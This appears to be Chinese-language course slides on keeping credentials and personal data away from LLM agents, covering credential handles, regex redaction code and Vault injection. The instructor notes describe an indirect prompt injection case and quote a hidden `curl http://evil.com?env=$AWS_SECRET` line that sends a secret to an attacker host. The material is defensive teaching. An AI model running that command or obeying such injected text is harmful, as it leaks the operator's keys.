        # 1. LLM 仅能看到抽象句柄 "cred_id": "AWS_PROD_S3" ★

        env = {"AWS_SECRET_ACCESS_KEY": real_secret.value}
        raw_observation = sandbox.run(tool_call, env=env)
        
        # 4. 回载给 LLM 前强行脱敏 PII/身份证/手机号/明文Key ★
        sanitized_obs = self.redact_pii_and_keys(raw_observation)
        return sanitized_obs

    def redact_pii_and_keys(self, text: str) -> str:
        text = re.sub(r"AKIA[0-9A-Z]{16}", "[REDACTED_AWS_AK]", text)
        text = re.sub(r"1[3-9]\d{9}", "[REDACTED_PHONE]", text)
        return text
  • 句柄化解耦：大模型接触不到任何物理明文密码，仅感知符号化句柄（Credential Alias）。

敏感信息与凭证隔离的三大工程支柱

Secret & PII Isolation Pillars

Privacy Control
1. 凭证句柄化 (Credential Handles) No Secret in Prompt

模型只需输出 `credential_alias: "PROD_RDS_DB"`。宿主侧根据句柄向沙箱环境变量安全填充真实密码，彻底断绝 Key 在 Token 层的暴传。

2. PII 隐私出站脱敏 (PII Scrubbing Pipeline) Observation Redaction

工具执行完毕向 LLM 返回 Observation 时，前置正则与 NER 模型自动把手机号、身份证、邮箱及 API 响应里的 Key 替换为 `[REDACTED]`。

3. 宿主 Vault / Secrets 注入 (Host-Side Auto-Inject) HashiCorp Vault / KMS Integration

建立与 AWS Secrets Manager 或 HashiCorp Vault 的宿主原生连接，实现密钥在物理沙箱内的短生命周期动态轮转（Secret Rotation）。

实践案例：GitHub Copilot / Cursor 绝不向远端发送真实机器密钥

Architectural Core Thesis / 架构师视角

大模型不需要知道物理密钥是什么！构建 凭证句柄化（Credential Handles）与 PII 自动化脱敏过滤管道，是防止企业敏感凭证被越狱注入攻击提权的绝对防线。

🎯 剖析为何绝不把密钥发给大模型： “向学员深入剖析：在构建企业级 Agent 时，最严重的漏洞就是直接把数据库连接串（如 `postgres://root:password@...`）或者 AWS Secret Key 当作工具入参暴露给大模型。如果发生间接提示词注入（Indirect Prompt Injection），攻击者只要在网页或文档里藏一句 `curl http://evil.com?env=$AWS_SECRET`，密钥瞬间泄露。”
💡 讲授凭证句柄与 PII 脱敏管道： “提示学员：正确的解法是‘凭证句柄化’。大模型只需要输出句柄名称 `credential_alias: "PROD_AWS_KEY"`，由宿主侧的安全管理器从 Vault 动态拉取密钥注入隔离沙箱；同时在沙箱 Observation 返回给大模型前，用正则和脱敏管道清洗掉敏感的身份证、手机号和 API 响应 Key，做到双向零泄露。”
